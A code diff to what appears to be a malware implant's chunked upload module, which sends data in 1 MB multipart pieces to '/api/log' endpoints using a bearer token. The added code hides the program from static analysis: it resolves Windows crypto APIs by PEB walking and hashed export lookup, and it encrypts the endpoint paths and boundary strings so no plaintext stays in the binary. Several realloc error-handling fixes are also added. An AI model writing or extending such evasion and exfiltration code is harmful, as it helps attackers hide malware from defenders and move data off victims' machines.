@@ -1,5 +1,9 @@
 #include "chunked.h"
 #include "ws2.h"
+#include "enc_strings.h"
+#include "peb.h"
+#include "export_resolve.h"
+#include "hash.h"
 
 #include <stdlib.h>
 #include <string.h>
@@ -8,7 +12,35 @@
 #ifdef _WIN32
 #include <windows.h>
 #include <wincrypt.h>
-#pragma comment(lib, "advapi32.lib")
+
+/* PEB-walk API resolution for advapi32 Crypt* functions */
+typedef BOOL (WINAPI *pCryptAcquireContextA)(HCRYPTPROV *, LPCSTR, LPCSTR, DWORD, DWORD);
+typedef BOOL (WINAPI *pCryptGenRandom)(HCRYPTPROV, DWORD, BYTE *);
+typedef BOOL (WINAPI *pCryptReleaseContext)(HCRYPTPROV, DWORD);
+
+static struct {
+    pCryptAcquireContextA pCA;
+    pCryptGenRandom       pGR;
+    pCryptReleaseContext  pRC;
+    int ready;
+} g_crypt_api;
+
+static int crypt_ensure_api(void) {
+    if (g_crypt_api.ready) return 1;
+    char dll[32]; enc_decrypt(enc_advapi32, ENC_ADVAPI32_LEN, dll);
+    void *adv = mirage_get_module_by_hash(mirage_encrypted_hash_module(dll));
+    if (!adv) return 0;
+    char fn[32];
+    enc_decrypt(enc_CryptAcquireContextA, ENC_CRYPTACQUIRECONTEXTA_LEN, fn);
+    g_crypt_api.pCA = (pCryptAcquireContextA)mirage_get_function_by_hash(adv, mirage_encrypted_hash_func(fn));
+    enc_decrypt(enc_CryptGenRandom, ENC_CRYPTGENRANDOM_LEN, fn);
+    g_crypt_api.pGR = (pCryptGenRandom)mirage_get_function_by_hash(adv, mirage_encrypted_hash_func(fn));
+    enc_decrypt(enc_CryptReleaseContext, ENC_CRYPTRELEASECONTEXT_LEN, fn);
+    g_crypt_api.pRC = (pCryptReleaseContext)mirage_get_function_by_hash(adv, mirage_encrypted_hash_func(fn));
+    if (!g_crypt_api.pCA || !g_crypt_api.pGR || !g_crypt_api.pRC) return 0;
+    g_crypt_api.ready = 1;
+    return 1;
+}
 #else
 #include <fcntl.h>
 #include <unistd.h>
@@ -17,12 +49,8 @@
 #define CHUNK_SIZE       (1024u * 1024u)  /* 1 MB */
 #define MAX_RETRIES      3u
 
-static const char chunk_boundary[]    = "----ZialfiChunkBoundary7XkR9fL2";
-static const char complete_boundary[] = "----ZialfiCompleteBoundary1Yz8Wk3P";
-
-/* ── paths (normally xor-encrypted) ───────────────────────────── */
-static const char chunk_path[]    = "/api/log/chunk";
-static const char complete_path[] = "/api/log/complete";
+/* Encrypted at build time — decrypted at use via enc_decrypt() */
+/* chunk_boundary, complete_boundary, chunk_path, complete_path moved to enc_strings.h */
 
 /* ── session id generation ─────────────────────────────────────── */
 
@@ -30,13 +58,13 @@ char *chunked_generate_session_id(void) {
     uint8_t raw[16];
 #ifdef _WIN32
     HCRYPTPROV hProv;
-    if (!CryptAcquireContextA(&hProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT))
+    if (!crypt_ensure_api() || !g_crypt_api.pCA(&hProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT))
         return NULL;
-    if (!CryptGenRandom(hProv, sizeof(raw), raw)) {
-        CryptReleaseContext(hProv, 0);
+    if (!g_crypt_api.pGR(hProv, sizeof(raw), raw)) {
+        g_crypt_api.pRC(hProv, 0);
         return NULL;
     }
-    CryptReleaseContext(hProv, 0);
+    g_crypt_api.pRC(hProv, 0);
 #else
     int fd = open("/dev/urandom", O_RDONLY);
     if (fd < 0) return NULL;
@@ -55,21 +83,25 @@ char *chunked_generate_session_id(void) {
 
 /* ── multipart body builders ───────────────────────────────────── */
 
-static void append_field(uint8_t **buf, size_t *len, size_t *cap,
-                         const char *data, size_t dlen) {
+static int append_field(uint8_t **buf, size_t *len, size_t *cap,
+                        const char *data, size_t dlen) {
     while (*len + dlen > *cap) {
-        *cap = (*cap) ? (*cap) * 2 : 4096;
-        *buf = realloc(*buf, *cap);
+        size_t nc = (*cap) ? (*cap) * 2 : 4096;
+        uint8_t *nb = realloc(*buf, nc);
+        if (!nb) return -1;
+        *buf = nb;
+        *cap = nc;
     }
     memcpy(*buf + *len, data, dlen);
     *len += dlen;
+    return 0;
 }
 
 #define APPEND_STR(buf, len, cap, s) \
-    append_field((buf), (len), (cap), (s), strlen(s))
+    do { if (append_field((buf), (len), (cap), (s), strlen(s)) < 0) return NULL; } while(0)
 
 #define APPEND_LIT(buf, len, cap, s) \
-    append_field((buf), (len), (cap), (s), sizeof(s) - 1)
+    do { if (append_field((buf), (len), (cap), (s), sizeof(s) - 1) < 0) return NULL; } while(0)
 
 uint8_t *chunked_build_chunk_body(
     const char  *boundary,
@@ -97,7 +129,7 @@ uint8_t *chunked_build_chunk_body(
         "\r\nContent-Disposition: form-data; name=\"chunk_index\"\r\n\r\n");
     char idx_buf[32];
     int n = snprintf(idx_buf, sizeof(idx_buf), "%zu", chunk_index);
-    append_field(&buf, &len, &cap, idx_buf, (size_t)n);
+    if (append_field(&buf, &len, &cap, idx_buf, (size_t)n) < 0) { free(buf); return NULL; }
     APPEND_LIT(&buf, &len, &cap, "\r\n");
 
     /* data field */
@@ -106,7 +138,7 @@ uint8_t *chunked_build_chunk_body(
     APPEND_LIT(&buf, &len, &cap,
         "\r\nContent-Disposition: form-data; name=\"data\"; filename=\"chunk.bin\"\r\n"
         "Content-Type: application/octet-stream\r\n\r\n");
-    append_field(&buf, &len, &cap, (const char *)chunk_data, chunk_len);
+    if (append_field(&buf, &len, &cap, (const char *)chunk_data, chunk_len) < 0) { free(buf); return NULL; }
     APPEND_LIT(&buf, &len, &cap, "\r\n");
 
     /* closing boundary */
@@ -144,7 +176,7 @@ uint8_t *chunked_build_complete_body(
         "\r\nContent-Disposition: form-data; name=\"total_chunks\"\r\n\r\n");
     char tc_buf[32];
     int n = snprintf(tc_buf, sizeof(tc_buf), "%zu", total_chunks);
-    append_field(&buf, &len, &cap, tc_buf, (size_t)n);
+    if (append_field(&buf, &len, &cap, tc_buf, (size_t)n) < 0) { free(buf); return NULL; }
     APPEND_LIT(&buf, &len, &cap, "\r\n");
 
     /* metadata */
@@ -153,7 +185,7 @@ uint8_t *chunked_build_complete_body(
     APPEND_LIT(&buf, &len, &cap,
         "\r\nContent-Disposition: form-data; name=\"metadata\"\r\n\r\n");
     if (metadata && metadata_len > 0)
-        append_field(&buf, &len, &cap, metadata, metadata_len);
+        if (append_field(&buf, &len, &cap, metadata, metadata_len) < 0) { free(buf); return NULL; }
     APPEND_LIT(&buf, &len, &cap, "\r\n");
 
     /* closing boundary */
@@ -181,55 +213,52 @@ static int http_post_multipart(
 {
     /* build Content-Type header */
     char ct_hdr[256];
-    int ct_len = snprintf(ct_hdr, sizeof(ct_hdr),
+    snprintf(ct_hdr, sizeof(ct_hdr),
         "Content-Type: multipart/form-data; boundary=%s", boundary);
 
     char auth_hdr[512];
-    int ah_len = snprintf(auth_hdr, sizeof(auth_hdr), "Bearer %s", token);
+    snprintf(auth_hdr, sizeof(auth_hdr), "Bearer %s", token);
 
-    /* build full request */
-    size_t hdr_cap = 2048;
-    size_t hdr_len = 0;
-    char *hdr = malloc(hdr_cap);
-    if (!hdr) return 0;
+    /* build full request — dynamic buffer, no fixed ceiling */
+    uint8_t *hdr = NULL;
+    size_t hdr_len = 0, hdr_cap = 0;
+    char line[512];
+    int n;
 
-    /* request line */
-    hdr_len += snprintf(hdr + hdr_len, hdr_cap - hdr_len,
-        "POST %s HTTP/1.1\r\n", path);
-    hdr_len += snprintf(hdr + hdr_len, hdr_cap - hdr_len,
-        "Host: %s\r\n", host);
-    hdr_len += snprintf(hdr + hdr_len, hdr_cap - hdr_len,
-        "Authorization: %s\r\n", auth_hdr);
-    hdr_len += snprintf(hdr + hdr_len, hdr_cap - hdr_len,
-        "%s\r\n", ct_hdr);
-    hdr_len += snprintf(hdr + hdr_len, hdr_cap - hdr_len,
-        "Content-Length: %zu\r\n", body_len);
-    hdr_len += snprintf(hdr + hdr_len, hdr_cap - hdr_len,
-        "Connection: close\r\n\r\n");
-
+    n = snprintf(line, sizeof(line), "POST %s HTTP/1.1\r\n", path);
+    if (n > 0 && append_field(&hdr, &hdr_len, &hdr_cap, line, (size_t)n) < 0) { free(hdr); return 0; }
+    n = snprintf(line, sizeof(line), "Host: %s\r\n", host);
+    if (n > 0 && append_field(&hdr, &hdr_len, &hdr_cap, line, (size_t)n) < 0) { free(hdr); return 0; }
+    n = snprintf(line, sizeof(line), "Authorization: %s\r\n", auth_hdr);
+    if (n > 0 && append_field(&hdr, &hdr_len, &hdr_cap, line, (size_t)n) < 0) { free(hdr); return 0; }
+    n = snprintf(line, sizeof(line), "%s\r\n", ct_hdr);
+    if (n > 0 && append_field(&hdr, &hdr_len, &hdr_cap, line, (size_t)n) < 0) { free(hdr); return 0; }
+    n = snprintf(line, sizeof(line), "Content-Length: %zu\r\n", body_len);
+    if (n > 0 && append_field(&hdr, &hdr_len, &hdr_cap, line, (size_t)n) < 0) { free(hdr); return 0; }
+    if (append_field(&hdr, &hdr_len, &hdr_cap, "Connection: close\r\n\r\n", 19) < 0) { free(hdr); return 0; }
     ws2_socket_t sk;
     ws2_result_t r = ws2_connect(&sk, host, port);
     if (r != WS2_OK) { free(hdr); return 0; }
 
     size_t sent;
-    r = ws2_send((HANDLE)(intptr_t)&sk, (const uint8_t *)hdr, hdr_len, &sent);
+    r = ws2_send(sk.handle, hdr, hdr_len, &sent);
     free(hdr);
-    if (r != WS2_OK) { ws2_close((HANDLE)(intptr_t)&sk); return 0; }
+    if (r != WS2_OK) { ws2_close(sk.handle); return 0; }
 
-    r = ws2_send((HANDLE)(intptr_t)&sk, body, body_len, &sent);
-    if (r != WS2_OK) { ws2_close((HANDLE)(intptr_t)&sk); return 0; }
+    r = ws2_send(sk.handle, body, body_len, &sent);
+    if (r != WS2_OK) { ws2_close(sk.handle); return 0; }
 
     /* read response — look for "200" */
     char resp[4096];
     size_t total = 0, chunk;
     while (total < sizeof(resp) - 1) {
-        r = ws2_recv((HANDLE)(intptr_t)&sk, (uint8_t *)resp + total,
+        r = ws2_recv(sk.handle, (uint8_t *)resp + total,
                       sizeof(resp) - 1 - total, &chunk);
         if (r != WS2_OK || chunk == 0) break;
         total += chunk;
     }
     resp[total] = '\0';
-    ws2_close((HANDLE)(intptr_t)&sk);
+    ws2_close(sk.handle);
 
     return (total >= 12 && memcmp(resp, "HTTP/1.1 200", 12) == 0);
 }
@@ -245,6 +274,17 @@ chunk_result_t chunked_upload(
     const char   *metadata,
     size_t        metadata_len)
 {
+    /* Decrypt strings at use — no plaintext in .rdata */
+    char _b1[64], _b2[64], _p1[64], _p2[64];
+    enc_decrypt(enc_boundary_zialfi_chunk, ENC_BOUNDARY_ZIALFI_CHUNK_LEN, _b1);
+    enc_decrypt(enc_boundary_zialfi_complete, ENC_BOUNDARY_ZIALFI_COMPLETE_LEN, _b2);
+    enc_decrypt(enc_api_log_chunk, ENC_API_LOG_CHUNK_LEN, _p1);
+    enc_decrypt(enc_api_log_complete, ENC_API_LOG_COMPLETE_LEN, _p2);
+    const char *chunk_boundary    = _b1;
+    const char *complete_boundary = _b2;
+    const char *chunk_path        = _p1;
+    const char *complete_path     = _p2;
+
     char *session_id = chunked_generate_session_id();
     if (!session_id) return CHUNK_FAILED;
 
